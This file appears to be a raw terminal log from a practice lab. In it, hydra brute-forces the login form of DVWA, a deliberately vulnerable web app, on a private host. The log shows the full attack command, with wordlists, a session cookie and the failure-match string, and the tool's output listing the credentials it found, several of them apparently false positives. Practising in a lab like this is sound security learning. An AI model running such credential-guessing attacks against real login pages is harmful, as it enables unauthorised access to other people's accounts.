@@ -1,0 +1,40 @@
+┌──(user㉿kali)-[/usr/share/seclists/Passwords/Common-Credentials]
+└─$ hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt "http-get-form://192.168.0.104/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=c12qed6f5hs5abh4pkoagh1n69; security=low:F=Username and/or password incorrect"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-12 18:53:44
+[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 254425 login tries (l:10177/p:25), ~15902 tries per task
+[DATA] attacking http-get-form://192.168.0.104:80/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=c12qed6f5hs5abh4pkoagh1n69; security=low:F=Username and/or password incorrect
+[80][http-get-form] host: 192.168.0.104   login: admin   password: password
+[STATUS] 4582.00 tries/min, 4582 tries in 00:01h, 249843 to do in 00:55h, 16 active
+[STATUS] 4625.33 tries/min, 13876 tries in 00:03h, 240549 to do in 00:53h, 16 active
+[ERROR] Can not create restore file (./hydra.restore) - Permission denied
+[STATUS] 4637.43 tries/min, 32462 tries in 00:07h, 221963 to do in 00:48h, 16 active
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: password
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: 123456
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: 12345678
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: querty
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: abc123
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: monkey
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: letmein
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: dragon
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: 111111
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: baseball
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: iloveyou
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: trustno1
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: 1234567
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: sunshine
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: master
+[80][http-get-form] host: 192.168.0.104   login: d'anne   password: 123123
+[STATUS] 4642.60 tries/min, 69639 tries in 00:15h, 184786 to do in 00:40h, 16 active
+
+[STATUS] 4644.55 tries/min, 143981 tries in 00:31h, 110444 to do in 00:24h, 16 active
+[STATUS] 4643.19 tries/min, 167155 tries in 00:36h, 87270 to do in 00:19h, 16 active
+[80][http-get-form] host: 192.168.0.104   login: pablo   password: letmein
+[STATUS] 4644.27 tries/min, 190415 tries in 00:41h, 64010 to do in 00:14h, 16 active
+[STATUS] 4645.02 tries/min, 213671 tries in 00:46h, 40754 to do in 00:09h, 16 active
+[STATUS] 4645.16 tries/min, 236903 tries in 00:51h, 17522 to do in 00:04h, 16 active
+1 of 1 target successfully completed, 18 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-12 19:48:30
+                                                                            
